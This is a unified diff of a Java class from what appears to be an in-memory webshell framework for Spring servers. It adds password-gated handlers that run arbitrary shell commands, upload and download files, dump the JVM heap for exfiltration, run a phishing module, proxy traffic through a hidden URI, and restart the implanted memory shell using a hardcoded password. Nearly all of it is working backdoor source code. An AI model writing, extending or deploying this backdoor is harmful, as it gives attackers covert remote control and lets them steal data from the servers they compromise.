@@ -5,10 +5,13 @@ import com.stdout.Models.FileManager;
 import com.stdout.Models.HeapDumper;
 import com.stdout.Models.SpringProxy;
 import com.stdout.Utils.Redefine.MyRequest;
+import com.stdout.Utils.Redefine.MyResponse;
+import com.stdout.springMem.SpringMemShell;
+
+import java.lang.instrument.UnmodifiableClassException;
 
 public class PreDoFilter {
-    public static String PreDeal(Object request, Object response) throws Exception {
-        System.out.println("pre deal");
+    public static String PreDeal0(Object request, Object response) throws Exception {
         String result = "";
         String uri = MyRequest.getRequestURI(request);
         String ans = PreDelURI(uri);
@@ -29,53 +32,55 @@ public class PreDoFilter {
             if (password.equals(ShellConfig.SpringMemShellConfig.MemShellPassword)) {
                 String model = MyRequest.getParameter(request, "model");
 
-                if (model.equals("help")) {
-                    result += com.stdout.Models.Helper.help();
-                }
-
-                else if (model.equals("exec")) {
-                    String cmd = MyRequest.getParameter(request, "cmd");
-                    result += com.stdout.Models.CommandExecutor.exec(cmd);
-                }
-
-                else if (model.equals("fish")) {
-                    String action = MyRequest.getParameter(request, "action");
-                    if (action.equals("start")) {
-                        String target = MyRequest.getParameter(request, "target");
-                        String file = MyRequest.getParameter(request, "file");
-                        result += com.stdout.Models.Fish.fishStart(target, file);
-                    } else if (action.equals("stop")) {
-                        result += com.stdout.Models.Fish.fishStop();
-                    } else if (action.equals("show")) {
-                        result += com.stdout.Models.Fish.fishShow();
-                    }
-                }
-
-                else if (model.equals("file")) {
-                    String action = MyRequest.getParameter(request, "action");
-                    if (action == null) {
-                        result += FileManager.uploadView();
-                    } else if (action.equals("download")) {
-                        try {
-                            String path = MyRequest.getParameter(request, "path");
-                            FileManager.download(response, path);
-                            return null;
-                        } catch (Exception e) {
-                            result += "need param: path";
+                switch (model) {
+                    case "help":
+                        result += com.stdout.Models.Helper.help();
+                        break;
+                    case "exec":
+                        String cmd = MyRequest.getParameter(request, "cmd");
+                        result += com.stdout.Models.CommandExecutor.exec(cmd);
+                        break;
+                    case "fish": {
+                        String action = MyRequest.getParameter(request, "action");
+                        switch (action) {
+                            case "start":
+                                String target = MyRequest.getParameter(request, "target");
+                                String file = MyRequest.getParameter(request, "file");
+                                result += com.stdout.Models.Fish.fishStart(target, file);
+                                break;
+                            case "stop":
+                                result += com.stdout.Models.Fish.fishStop();
+                                break;
+                            case "show":
+                                result += com.stdout.Models.Fish.fishShow();
+                                break;
                         }
-                    } else if (action.equals("upload")) {
-                        result += FileManager.upload(request);
+                        break;
                     }
-                }
-
-                else if (model.equals("heapdump")) {
-                    String path = new HeapDumper().dumpHeap();
-                    FileManager.download(response, path);
-                    return null;
-                }
-
-                else if (model.equals("exit")) {
-                    result += com.stdout.springMem.SpringMemModels.exit();
+                    case "file": {
+                        String action = MyRequest.getParameter(request, "action");
+                        if (action == null) {
+                            result += FileManager.uploadView();
+                        } else if (action.equals("download")) {
+                            try {
+                                String path = MyRequest.getParameter(request, "path");
+                                FileManager.download(response, path);
+                                return null;
+                            } catch (Exception e) {
+                                result += "need param: path";
+                            }
+                        } else if (action.equals("upload")) {
+                            result += FileManager.upload(request);
+                        }
+                        break;
+                    }
+                    case "heapdump":
+                        String path = new HeapDumper().dumpHeap();
+                        FileManager.download(response, path);
+                        return null;
+                    case "exit":
+                        result += com.stdout.springMem.SpringMemModels.exit();
+                        break;
                 }
 
                 return result;
@@ -83,11 +88,51 @@ public class PreDoFilter {
         }
         return "";
     }
+    public static boolean PreDeal(Object request, Object response) throws Exception {
+        String result = PreDeal0(request, response);
+        if (result == null) {
+            try {
+                request.getClass().getDeclaredMethod("setHandled", new Class[]{boolean.class}).invoke(request, new Object[]{true});
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            return true;
+        }
+        if (!result.equals("")) {
+            MyResponse.getWriter(response).write(result);
+            // response.getWriter().write(result);
+            try {
+                request.getClass().getDeclaredMethod("setHandled", new Class[]{boolean.class}).invoke(request, new Object[]{true});
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            return true;
+        }
+        return false;
+    }
 
     public static String PreDelURI(String uri) {
         if (uri.equals("/eGluZ3hpbmcK")) {
             return "Proxy";
         }
         return null;
+    }
+
+    public static boolean Restart(Object request, Object response) {
+        try {
+            String password = MyRequest.getParameter(request, "password");
+            if (password.equals("shiroha")) {
+                String version = MyRequest.getParameter(request, "version");
+                if (version.equals("2")) {
+                    String result = SpringMemShell.start();
+                    MyResponse.getWriter(response).write(result);
+                    request.getClass().getDeclaredMethod("setHandled", new Class[]{boolean.class}).invoke(request, new Object[]{true});
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        return false;
     }
 }
